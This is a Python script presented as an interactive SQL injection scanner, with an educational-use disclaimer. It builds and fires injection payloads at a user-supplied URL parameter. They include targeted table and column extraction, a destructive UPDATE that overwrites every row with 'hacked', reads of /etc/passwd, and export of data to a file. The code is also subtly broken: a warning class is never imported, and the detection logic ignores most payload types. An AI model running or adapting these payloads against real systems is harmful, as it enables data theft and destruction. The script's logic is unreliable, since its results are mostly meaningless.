"""
SQL Injection Vulnerability Scanner

This script is designed to detect SQL injection vulnerabilities in web applications by testing various payload types against a specified parameter in a target URL. It supports multiple SQL injection techniques and database types.

Usage:
    Run the script and follow the interactive prompts to specify the target URL, parameter to test, payload categories, and database type.

Disclaimer:
    This tool is for educational and authorized security testing purposes only. Unauthorized use may violate laws and ethical guidelines. Always obtain explicit permission before testing any system.
"""

#!/usr/bin/env python3
import sys
import os
import time
import warnings
import requests
from urllib.parse import urlparse, urlunparse

# Suppress InsecureRequestWarning
warnings.filterwarnings("ignore", category=InsecureRequestWarning)

def get_user_choices():
    """Get user input for target and testing options."""
    while True:
        url = input("\nEnter target URL (e.g., http://example.com/page.php?id=1): ").strip()
        if not url:
            print("URL cannot be empty. Please try again.")
            continue

        try:
            parsed = urlparse(url)
            if not all([parsed.scheme, parsed.netloc]):
                raise ValueError
            break
        except ValueError:
            print("Invalid URL format. Please include http:// or https://")

    param = input("Enter parameter to test (e.g., id): ").strip()
    while not param:
        print("Parameter cannot be empty.")
        param = input("Enter parameter to test: ").strip()

    print("\n[1] Select payload categories (comma-separated):")
    print("1. Classic SQLi")
    print("2. Union-based")
    print("3. Error-based")
    print("4. Blind Boolean")
    print("5. Time-based")
    print("6. Stacked Queries")
    print("7. Out-of-Band")
    print("8. NoSQL")
    print("9. All payloads")
    categories = input("Your choices (e.g., 1,2,5): ").strip().split(',')

    print("\n[2] Select database type:")
    print("1. MySQL")
    print("2. MSSQL")
    print("3. PostgreSQL")
    print("4. Oracle")
    print("5. SQLite")
    print("6. Unknown/Generic")
    db_type = input("Your choice (1-6): ").strip()

    db_info = {}
    if input("\n[3] Do you want to specify database/table/column? (y/n): ").lower() == 'y':
        db_info['db'] = input("Database name (leave empty if unknown): ").strip() or None
        db_info['table'] = input("Table name (leave empty if unknown): ").strip() or None
        db_info['column'] = input("Column name (leave empty if unknown): ").strip() or None
        db_info['limit'] = input("Row limit for data extraction (default 10): ").strip() or "10"

    return url, param, categories, db_type, db_info

def generate_payloads(categories, db_type, db_info=None):
    """Generate payloads based on user selections."""
    payloads = []
    db_name = db_info.get('db', 'database()') if db_info else 'database()'
    table = db_info.get('table') if db_info else None
    column = db_info.get('column') if db_info else None
    limit = db_info.get('limit', '10') if db_info else '10'

    # Classic SQLi
    if '1' in categories or '9' in categories:
        classic = [
            ("' OR '1'='1", "Classic"),
            ("' OR 1=1--", "Classic"),
            ('" OR "1"="1', "Classic"),
            ("') OR ('1'='1", "Classic"),
            ("' OR 'a'='a", "Classic"),
        ]
        payloads.extend(classic)

    # Union-based
    if '2' in categories or '9' in categories:
        union = [
            ("' UNION SELECT null,null--", "Union"),
            ("' UNION SELECT 1,2,3--", "Union"),
        ]

        if table and column:
            union.extend([
                (f"' UNION SELECT null,{column},null FROM {table} LIMIT {limit}--", "Targeted Union"),
                (f"' UNION SELECT 1,GROUP_CONCAT({column}),3 FROM {table}--", "Targeted Data"),
            ])
        elif table:
            union.extend([
                (f"' UNION SELECT null,column_name,null FROM information_schema.columns WHERE table_name='{table}'--", "Column Enum"),
            ])

        payloads.extend(union)

    # Error-based
    if '3' in categories or '9' in categories:
        error = [
            ("' AND GTID_SUBSET(@@version,0)--", "Error"),
            ("' AND 1=CONVERT(int,@@version)--", "Error"),
        ]

        if db_type == '1':  # MySQL
            error.append(("' AND extractvalue(rand(),concat(0x3a,version()))--", "MySQL Error"))
        elif db_type == '2':  # MSSQL
            error.append(("' AND 1=CONVERT(int,db_name())--", "MSSQL Error"))

        payloads.extend(error)

    # Blind Boolean
    if '4' in categories or '9' in categories:
        blind = [
            ("' AND 1=1--", "Blind"),
            ("' AND 1=2--", "Blind"),
        ]

        if table and column:
            blind.extend([
                (f"' AND (SELECT SUBSTRING({column},1,1) FROM {table} LIMIT 1)='a'--", "Targeted Blind"),
                (f"' AND (SELECT COUNT({column}) FROM {table})>0--", "Targeted Blind"),
            ])

        payloads.extend(blind)

    # Time-based
    if '5' in categories or '9' in categories:
        time_based = [
            ("' OR (SELECT SLEEP(5))--", "Time-based"),
        ]

        if db_type == '1':  # MySQL
            time_based.append(("' OR BENCHMARK(10000000,MD5('A'))--", "MySQL Time"))
        elif db_type == '2':  # MSSQL
            time_based.append(("' WAITFOR DELAY '0:0:5'--", "MSSQL Time"))

        if table:
            time_based.append((f"' OR IF(EXISTS(SELECT * FROM {table}),SLEEP(5),0)--", "Table Check"))

        payloads.extend(time_based)

    # Stacked Queries
    if '6' in categories or ('9' in categories and db_type in ['1', '2', '3']):  # MySQL/MSSQL/PostgreSQL
        stacked = [
            ("'; SELECT SLEEP(5)--", "Stacked"),
        ]

        if table and column:
            stacked.append((f"'; UPDATE {table} SET {column}='hacked' WHERE 1=1--", "Destructive"))

        payloads.extend(stacked)

    # Out-of-Band
    if '7' in categories or '9' in categories:
        oob = [
            ("' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--", "OOB File Read"),
        ]

        if db_type == '1' and table and column:  # MySQL
            oob.append((f"' UNION SELECT 1,{column} FROM {table} INTO OUTFILE '/tmp/data.txt'--", "OOB Data Export"))

        payloads.extend(oob)

    # NoSQL
    if '8' in categories or '9' in categories:
        nosql = [
            ('{"$where": "1 == 1"}', "NoSQL"),
            ('{"$ne": "1"}', "NoSQL"),
        ]

        if table and column:
            nosql.append((f'{{"{column}": {{"$ne": ""}}}}', "Targeted NoSQL"))

        payloads.extend(nosql)

    return payloads

def test_injection(url, param, payloads):
    """Test for SQL injection vulnerabilities."""
    vulnerable = False

    for payload, payload_type in payloads:
        print(f"\nTesting {payload_type}: {payload}")

        parsed = urlparse(url)
        query = f"{param}={requests.utils.quote(payload)}"
        test_url = urlunparse(parsed._replace(query=f"{parsed.query}&{query}" if parsed.query else query))

        try:
            start_time = time.time()
            response = requests.get(
                test_url,
                headers={'User-Agent': 'SQLiScanner/1.0'},
                timeout=10,
                verify=False
            )
            elapsed = time.time() - start_time

            if "Time-based" in payload_type and elapsed > 5:
                print(f"[!] Potential vulnerability (delayed response: {elapsed:.2f} s)")
                vulnerable = True
            else:
                print("[-] No obvious vulnerability detected")

        except Exception as e:
            print(f"[x] Error: {str(e)}")

        time.sleep(1)

    return vulnerable

if __name__ == "__main__":
    print("Starting SQL Injection Vulnerability Scan...")
    print("This tool is for educational and authorized testing only.")
    url, param, categories, db_type, db_info = get_user_choices()
    payloads = generate_payloads(categories, db_type, db_info)

    print(f"\nInitiating scan with {len(payloads)} payloads...")
    if test_injection(url, param, payloads):
        print("\n[!] Potential vulnerabilities found!")
    else:
        print("\n[-] No obvious vulnerabilities detected")

    print("\nScan complete. Verify results manually.")